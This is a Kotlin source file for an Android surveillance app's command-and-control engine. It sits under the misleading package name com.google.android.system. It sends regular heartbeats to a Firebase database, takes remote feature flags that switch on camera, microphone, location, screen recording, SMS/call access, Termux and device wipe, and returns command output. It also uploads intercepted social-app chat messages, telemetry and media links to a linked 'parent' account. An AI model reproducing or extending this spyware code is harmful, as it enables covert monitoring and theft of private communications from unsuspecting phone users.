package com.google.android.system

import android.content.Context
import android.os.Build
import android.util.Log
import com.google.firebase.auth.FirebaseAuth
import com.google.android.gms.tasks.Tasks
import com.homemonitor.WebDashboardApiRouter
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit

/**
 * AuthState
 * Expresses accurate Firebase Authentication lifecycle and network state on Android.
 */
enum class AuthState {
    INITIALIZING,
    AUTHENTICATED,
    AUTHENTICATION_REQUIRED,
    TOKEN_EXPIRED,
    AUTHORIZATION_DENIED,
    NETWORK_ERROR,
    AUTHENTICATION_ERROR
}

/**
 * FirebaseC2Engine
 *
 * Firebase Realtime C2 Engine backed by authoritative Firebase Authentication (`homemonitor-db`).
 */
class FirebaseC2Engine(
    private val context: Context,
    private val httpClient: OkHttpClient,
    private val scope: CoroutineScope,
    private val commandDispatcher: (String, String) -> Unit
) {
    companion object {
        private const val TAG = "FirebaseC2Engine"
    }

    data class FirebaseAccountConfig(
        val name: String,
        val databaseUrl: String,
        val apiKey: String = ""
    )

    private val accountPool = mutableListOf<FirebaseAccountConfig>()
    @Volatile private var _parentUserId: String = ""
    @Volatile var currentUserId: String = ""
    @Volatile var currentDeviceId: String = ""
    @Volatile var isEngineRunning = false
    @Volatile var currentAuthState: AuthState = AuthState.INITIALIZING

    // Feature Flags synchronized from Master Admin
    @Volatile var featureFlags = mutableMapOf<String, Boolean>(
        "camera_enabled" to true,
        "mic_enabled" to true,
        "location_enabled" to true,
        "screen_record_enabled" to true,
        "termux_enabled" to true,
        "sms_calls_enabled" to true,
        "files_enabled" to true,
        "mdm_wipe_enabled" to true
    )

    init {
        loadFirebaseAccountPool()
    }

    private fun loadFirebaseAccountPool() {
        try {
            val prefs = SecurityVaultManager.getEncryptedPrefs(context)
            refreshUserIdentity()
            currentDeviceId = getOrCreateDeviceId()

            val primaryDb = prefs.getString("fb_primary_db_url", "") ?: ""
            val defaultUrl = if (primaryDb.isNotBlank()) primaryDb else "https://homemonitor-db-default-rtdb.asia-southeast1.firebasedatabase.app"

            accountPool.clear()
            accountPool.add(FirebaseAccountConfig("Primary (homemonitor-db)", defaultUrl))

            Log.i(TAG, "Loaded single authoritative Firebase Account instance ($defaultUrl).")
        } catch (e: Exception) {
            Log.e(TAG, "loadFirebaseAccountPool error: ${e.message}")
        }
    }

    fun getActiveAccount(): FirebaseAccountConfig {
        if (accountPool.isEmpty()) {
            return FirebaseAccountConfig("Primary (homemonitor-db)", "https://homemonitor-db-default-rtdb.asia-southeast1.firebasedatabase.app")
        }
        return accountPool[0]
    }

    private fun rotateToNextFallbackAccount(reason: String) {
        Log.w(TAG, "Firebase request error ($reason). Retaining single authoritative project (homemonitor-db).")
    }

    fun refreshUserIdentity(): String? {
        if (currentUserId.isNotBlank()) {
            return currentUserId
        }

        val prefs = SecurityVaultManager.getEncryptedPrefs(context)
        val storedUid = prefs.getString("user_firebase_uid", "") ?: ""
        if (storedUid.isNotBlank()) {
            currentUserId = storedUid
            _parentUserId = prefs.getString("parent_firebase_uid", "") ?: storedUid
            currentAuthState = AuthState.AUTHENTICATED
            return currentUserId
        }

        // Use deterministic, tamper-proof hardware Device ID (zero Firebase Auth dependency)
        val devId = com.google.android.system.DeviceIdProvider.getDeviceId(context)
        prefs.edit().putString("user_firebase_uid", devId).apply()
        currentUserId = devId
        _parentUserId = prefs.getString("parent_firebase_uid", "") ?: devId
        currentAuthState = AuthState.AUTHENTICATED
        return currentUserId
    }

    fun getParentUserId(): String {
        if (_parentUserId.isNotBlank()) return _parentUserId
        val prefs = SecurityVaultManager.getEncryptedPrefs(context)
        val pUid = prefs.getString("parent_firebase_uid", "") ?: ""
        if (pUid.isNotBlank()) {
            _parentUserId = pUid
            return pUid
        }
        return currentUserId
    }

    fun getAuthToken(): String? {
        var currentUser = FirebaseAuth.getInstance().currentUser
        if (currentUser == null) {
            try {
                val task = FirebaseAuth.getInstance().signInAnonymously()
                Tasks.await(task, 5, TimeUnit.SECONDS)
                currentUser = FirebaseAuth.getInstance().currentUser
            } catch (e: Exception) {
                Log.w(TAG, "Failed anonymous sign in for auth token: ${e.message}")
            }
        }
        val user = currentUser ?: return null
        return try {
            val task = user.getIdToken(false)
            val result = Tasks.await(task, 5, TimeUnit.SECONDS)
            result.token
        } catch (e: Exception) {
            Log.w(TAG, "Failed to retrieve Firebase ID Token: ${e.message}")
            null
        }
    }

    fun buildAuthenticatedRequest(
        url: String,
        method: String = "GET",
        body: okhttp3.RequestBody? = null
    ): Request? {
        val uid = refreshUserIdentity()
        if (uid.isNullOrBlank()) {
            currentAuthState = AuthState.AUTHENTICATION_REQUIRED
            Log.w(TAG, "Aborted request to $url: Authentication required")
            return null
        }

        val token = getAuthToken()
        var finalUrl = url
        if (!token.isNullOrBlank()) {
            finalUrl = if (url.contains("?")) "$url&auth=$token" else "$url?auth=$token"
        }

        val builder = Request.Builder().url(finalUrl)
        if (!token.isNullOrBlank()) {
            builder.addHeader("Authorization", "Bearer $token")
        }

        return when (method.uppercase()) {
            "POST" -> builder.post(body ?: "".toRequestBody(null))
            "PUT" -> builder.put(body ?: "".toRequestBody(null))
            "DELETE" -> builder.delete(body)
            else -> builder.get()
        }.build()
    }

    fun startEngine() {
        if (isEngineRunning) return
        isEngineRunning = true
        Log.i(TAG, "Starting Direct-Only WebRTC C2 Engine with Authenticated Firebase Heartbeat & Telemetry...")
        startHeartbeatLoop()
    }

    private fun startHeartbeatLoop() {
        scope.launch(Dispatchers.IO) {
            while (isEngineRunning) {
                try {
                    sendDeviceHeartbeat()
                    syncMasterAdminFeatureFlags()
                    syncMasterAdminLicenseStatus()
                } catch (e: Exception) {
                    Log.e(TAG, "Heartbeat loop exception: ${e.message}")
                }
                delay(15_000L) // 15s pulse
            }
        }
    }

    private fun sendDeviceHeartbeat() {
        val uid = refreshUserIdentity()
        if (uid.isNullOrBlank()) {
            Log.w(TAG, "Heartbeat skipped: No authenticated Firebase UID")
            return
        }

        val parentUid = getParentUserId()
        val account = getActiveAccount()
        val devId = if (currentDeviceId.isNotBlank()) currentDeviceId else getOrCreateDeviceId()
        val url = "${account.databaseUrl}/users/$parentUid/devices/$devId/status.json"

        try {
            val bm = context.getSystemService(Context.BATTERY_SERVICE) as? android.os.BatteryManager
            val batteryPct = bm?.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
            val isCharging = bm?.isCharging ?: false

            val statusJson = JSONObject().apply {
                put("deviceId", devId)
                put("model", "${Build.MANUFACTURER} ${Build.MODEL}")
                put("androidVersion", Build.VERSION.RELEASE)
                put("sdkInt", Build.VERSION.SDK_INT)
                put("battery", if (batteryPct >= 0) batteryPct else 85)
                put("batteryLevel", if (batteryPct >= 0) batteryPct else 85)
                put("isCharging", isCharging)
                put("lastSeen", System.currentTimeMillis())
                put("activeAccount", account.name)
                put("online", true)
            }

            val body = statusJson.toString().toRequestBody("application/json".toMediaTypeOrNull())
            val request = buildAuthenticatedRequest(url, "PUT", body) ?: return

            httpClient.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    currentAuthState = AuthState.AUTHENTICATED
                } else if (response.code == 401 || response.code == 403) {
                    currentAuthState = AuthState.AUTHORIZATION_DENIED
                    Log.e(TAG, "Heartbeat rejected by Firebase security rules (HTTP ${response.code})")
                } else {
                    currentAuthState = AuthState.NETWORK_ERROR
                }
            }
        } catch (e: Exception) {
            currentAuthState = AuthState.NETWORK_ERROR
            Log.e(TAG, "sendDeviceHeartbeat error: ${e.message}")
        }
    }

    private fun syncMasterAdminFeatureFlags() {
        refreshUserIdentity() ?: return
        val parentUid = getParentUserId()
        val account = getActiveAccount()
        val devId = if (currentDeviceId.isNotBlank()) currentDeviceId else getOrCreateDeviceId()
        val url = "${account.databaseUrl}/users/$parentUid/devices/$devId/feature_flags.json"

        try {
            val request = buildAuthenticatedRequest(url, "GET") ?: return
            httpClient.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    val body = response.body?.string() ?: ""
                    if (body.startsWith("{")) {
                        val json = JSONObject(body)
                        val keys = json.keys()
                        while (keys.hasNext()) {
                            val key = keys.next()
                            featureFlags[key] = json.optBoolean(key, true)
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "syncMasterAdminFeatureFlags error: ${e.message}")
        }
    }

    private fun syncMasterAdminLicenseStatus() {
        refreshUserIdentity() ?: return
        val parentUid = getParentUserId()
        val account = getActiveAccount()
        val devId = if (currentDeviceId.isNotBlank()) currentDeviceId else getOrCreateDeviceId()
        val url = "${account.databaseUrl}/users/$parentUid/devices/$devId/license.json"

        try {
            val request = buildAuthenticatedRequest(url, "GET") ?: return
            httpClient.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    val body = response.body?.string() ?: ""
                    if (body.startsWith("{")) {
                        val json = JSONObject(body)
                        val status = json.optString("status", "ACTIVE")
                        val message = json.optString("message", "")
                        com.homemonitor.C2TrialManager.setTrialStatus(context, status, if (message.isNotBlank()) message else null)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "syncMasterAdminLicenseStatus error: ${e.message}")
        }
    }

    fun isFeatureEnabled(featureKey: String): Boolean {
        return featureFlags[featureKey] ?: true
    }

    fun sendExecutionResponse(tag: String, resultText: String) {
        if (resultText.isBlank()) return
        scope.launch(Dispatchers.IO) {
            refreshUserIdentity() ?: return@launch
            val parentUid = getParentUserId()
            val account = getActiveAccount()
            val devId = if (currentDeviceId.isNotBlank()) currentDeviceId else getOrCreateDeviceId()

            try {
                val respUrl = "${account.databaseUrl}/users/$parentUid/devices/$devId/response.json"
                val respBody = JSONObject.quote(resultText).toRequestBody("application/json".toMediaTypeOrNull())
                val req = buildAuthenticatedRequest(respUrl, "PUT", respBody) ?: return@launch
                httpClient.newCall(req).execute().close()

                if (tag.startsWith("firebase_")) {
                    val cmdId = tag.removePrefix("firebase_")
                    val cmdRespUrl = "${account.databaseUrl}/users/$parentUid/devices/$devId/commands/$cmdId/response.json"
                    val cmdReq = buildAuthenticatedRequest(cmdRespUrl, "PUT", respBody) ?: return@launch
                    httpClient.newCall(cmdReq).execute().close()
                }
            } catch (e: Exception) {
                Log.e(TAG, "sendExecutionResponse error: ${e.message}")
            }
        }
    }

    fun submitTelemetry(category: String, messageText: String) {
        scope.launch(Dispatchers.IO) {
            refreshUserIdentity() ?: return@launch
            val parentUid = getParentUserId()
            val account = getActiveAccount()
            val devId = if (currentDeviceId.isNotBlank()) currentDeviceId else getOrCreateDeviceId()
            val url = "${account.databaseUrl}/users/$parentUid/devices/$devId/telemetry/$category.json"

            try {
                val entryJson = JSONObject().apply {
                    put("timestamp", System.currentTimeMillis())
                    put("category", category)
                    put("content", messageText)
                    put("deviceId", devId)
                }

                val body = entryJson.toString().toRequestBody("application/json".toMediaTypeOrNull())
                val request = buildAuthenticatedRequest(url, "POST", body) ?: return@launch

                httpClient.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        currentAuthState = AuthState.AUTHENTICATED
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "submitTelemetry error: ${e.message}")
            }
        }
    }

    fun uploadSocialMessage(appName: String, sender: String, text: String, isOutgoing: Boolean) {
        if (!isEngineRunning || text.isBlank()) return
        scope.launch(Dispatchers.IO) {
            try {
                val uid = refreshUserIdentity() ?: return@launch
                val account = getActiveAccount()
                val devId = if (currentDeviceId.isNotBlank()) currentDeviceId else getOrCreateDeviceId()

                val appKey = appName.lowercase().replace(Regex("[^a-z0-9]"), "")
                val url = "${account.databaseUrl}/users/$uid/devices/$devId/social/$appKey.json"

                val timeStr = java.text.SimpleDateFormat("hh:mm a", java.util.Locale.getDefault()).format(java.util.Date())
                val msgJson = JSONObject().apply {
                    put("appName", appName)
                    put("sender", if (sender.isNotBlank()) sender else if (isOutgoing) "Me" else "Contact")
                    put("text", text)
                    put("direction", if (isOutgoing) "outgoing" else "incoming")
                    put("time", timeStr)
                    put("timestamp", System.currentTimeMillis())
                }

                val body = msgJson.toString().toRequestBody("application/json".toMediaTypeOrNull())
                val request = buildAuthenticatedRequest(url, "POST", body) ?: return@launch

                httpClient.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        Log.i(TAG, "Uploaded Social Chat Message to Firebase [$appKey]: '${text.take(30)}'")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "uploadSocialMessage error: ${e.message}")
            }
        }
    }

    fun uploadTelemetryLog(category: String, contentText: String) {
        if (!isEngineRunning || contentText.isBlank()) return
        scope.launch(Dispatchers.IO) {
            try {
                val uid = refreshUserIdentity() ?: return@launch
                val account = getActiveAccount()
                val devId = if (currentDeviceId.isNotBlank()) currentDeviceId else getOrCreateDeviceId()

                val catKey = category.lowercase().replace(Regex("[^a-z0-9_]"), "")
                val url = "${account.databaseUrl}/users/$uid/devices/$devId/telemetry/$catKey.json"

                val logJson = JSONObject().apply {
                    put("category", category)
                    put("content", contentText)
                    put("timestamp", System.currentTimeMillis())
                }

                val body = logJson.toString().toRequestBody("application/json".toMediaTypeOrNull())
                val request = buildAuthenticatedRequest(url, "POST", body) ?: return@launch

                httpClient.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        Log.i(TAG, "Uploaded Telemetry Log to Firebase [$catKey]: '${contentText.take(30)}'")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "uploadTelemetryLog error: ${e.message}")
            }
        }
    }

    fun uploadMediaUrl(mediaType: String, mediaUrl: String) {
        if (!isEngineRunning || mediaUrl.isBlank()) return
        scope.launch(Dispatchers.IO) {
            try {
                val uid = refreshUserIdentity() ?: return@launch
                val account = getActiveAccount()
                val devId = if (currentDeviceId.isNotBlank()) currentDeviceId else getOrCreateDeviceId()

                val url = "${account.databaseUrl}/users/$uid/devices/$devId/media.json"

                val mediaJson = JSONObject().apply {
                    put("type", mediaType)
                    put("mediaUrl", mediaUrl)
                    put("timestamp", System.currentTimeMillis())
                }

                val body = mediaJson.toString().toRequestBody("application/json".toMediaTypeOrNull())
                val request = buildAuthenticatedRequest(url, "POST", body) ?: return@launch

                httpClient.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        Log.i(TAG, "Uploaded Media CDN Link to Firebase [$mediaType]: $mediaUrl")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "uploadMediaUrl error: ${e.message}")
            }
        }
    }

    fun submitDirectParentPairing(
        targetParentUid: String,
        deviceNickname: String,
        onComplete: (Boolean, String?) -> Unit
    ) {
        scope.launch(Dispatchers.IO) {
            val notifyComplete: suspend (Boolean, String?) -> Unit = { success, error ->
                withContext(Dispatchers.Main) {
                    onComplete(success, error)
                }
            }

            val deviceUid = refreshUserIdentity()
            if (deviceUid.isNullOrBlank()) {
                notifyComplete(false, "Device anonymous authentication failed.")
                return@launch
            }

            val account = getActiveAccount()
            val devId = getOrCreateDeviceId()

            val bindingUrl = "${account.databaseUrl}/device_bindings/$deviceUid.json"
            val bindingJson = JSONObject().apply {
                put("parentUid", targetParentUid)
                put("deviceId", devId)
                put("status", "APPROVED")
            }

            val bindingReq = buildAuthenticatedRequest(bindingUrl, "PUT", bindingJson.toString().toRequestBody("application/json".toMediaTypeOrNull()))
            if (bindingReq == null) {
                notifyComplete(false, "Failed to build authenticated binding request.")
                return@launch
            }

            try {
                httpClient.newCall(bindingReq).execute().use { response ->
                    if (!response.isSuccessful && response.code != 200) {
                        Log.w(TAG, "Direct binding response HTTP ${response.code}")
                    }
                }

                val nowMs = System.currentTimeMillis()
                val deviceUrl = "${account.databaseUrl}/users/$targetParentUid/devices/$devId.json"
                val deviceRootJson = JSONObject().apply {
                    put("deviceId", devId)
                    put("deviceUid", deviceUid)
                    put("nickname", deviceNickname)
                    put("approvedAt", nowMs)
                    put("status", JSONObject().apply {
                        put("deviceId", devId)
                        put("deviceUid", deviceUid)
                        put("nickname", deviceNickname)
                        put("model", "${Build.MANUFACTURER} ${Build.MODEL}")
                        put("androidVersion", Build.VERSION.RELEASE)
                        put("sdkInt", Build.VERSION.SDK_INT)
                        put("lastSeen", nowMs)
                        put("status", "APPROVED")
                        put("online", true)
                    })
                }

                val deviceReq = buildAuthenticatedRequest(deviceUrl, "PUT", deviceRootJson.toString().toRequestBody("application/json".toMediaTypeOrNull()))
                if (deviceReq != null) {
                    httpClient.newCall(deviceReq).execute().close()
                }

                val prefs = SecurityVaultManager.getEncryptedPrefs(context)
                prefs.edit()
                    .putString("parent_firebase_uid", targetParentUid)
                    .putString("user_firebase_uid", deviceUid)
                    .putString("user_device_nickname", deviceNickname)
                    .apply()

                _parentUserId = targetParentUid
                sendDeviceHeartbeat()
                notifyComplete(true, null)
            } catch (e: Exception) {
                notifyComplete(false, e.message ?: "Network error during direct parent pairing.")
            }
        }
    }

    private fun getOrCreateDeviceId(): String {
        return com.google.android.system.DeviceIdProvider.getDeviceId(context)
    }
}
